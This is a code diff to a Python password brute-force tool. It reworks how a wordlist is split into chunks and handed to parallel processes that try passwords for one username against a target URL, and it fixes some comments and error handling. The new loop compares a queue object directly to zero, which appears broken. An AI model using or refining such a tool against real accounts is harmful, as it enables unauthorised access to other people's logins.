@@ -128,7 +128,7 @@ def attack(username, wordlist, process_queue):
 
 def thread_controller(wordlist, thread_words):
     """
-    Control the exec and termination of all threads spawned by this script.
+    Break the wordlist down into chunks and spawn threads to try each value in the chunk
 
     :param wordlist {String}: Path to wordlist file we want to use
     :param thread_words {Integer}: Word count to send to each thread for execution
@@ -136,16 +136,17 @@ def thread_controller(wordlist, thread_words):
     shared_process_queue = Queue()
 
     with open(wordlist, "r") as wordlist_line:
-        wordlist_sent = islice(
-            wordlist_line, thread_words
-        )  # Avoid reading entire file into memory
-        process = Process(
-            target=attack, args=(user, wordlist_sent, shared_process_queue)
-        )
-        process.daemon = True
-        process.start()
-        if shared_process_queue.qsize() > 0:
-            return shared_process_queue
+        while True:
+            # Avoid reading entire file into memory
+            wordlist_sent = list(islice(wordlist_line, thread_words))
+            if not wordlist_sent or shared_process_queue > 0:
+                break
+            process = Process(
+                target=attack, args=(user, wordlist_sent, shared_process_queue)
+            )
+            process.daemon = True
+            process.start()
+        return shared_process_queue
 
 
 # a bit of a mess but we needed this way instead of making a main function the returns all of that
@@ -154,7 +155,7 @@ def thread_controller(wordlist, thread_words):
 if __name__ == "__main__":
     thread_words = (
         120
-    )  # Note all Vars in this block are globle but we still pass params to make it easier to read
+    )  # Note all Vars in this block are global but we still pass params to make it easier to read
     try:
         options = parse()
         target_url = options.target_url
@@ -176,9 +177,8 @@ if __name__ == "__main__":
 
         creds()
         shared_process_queue = thread_controller(wordlist, thread_words)
-        if (
-            shared_process_queue.qsize() > 0
-        ):  # Need to repeat the check since it could end without the queue getting a value
+        if shared_process_queue.qsize() > 0:
+            # Need to repeat the check since it could end without the queue getting a value
             word = shared_process_queue.get()
             print("\nb[+] Password found: " + colored(word, "green"))
         else:
@@ -188,7 +188,7 @@ if __name__ == "__main__":
         print(colored("\n\n[-] Detected Ctrl + C ... Program Existed", "red"))
         sys.exit()
 
-    except Exception as e:
+    except Exception:
         print(
             colored(
                 "[-] Something went wrong - check wordlist path OR request timed out",
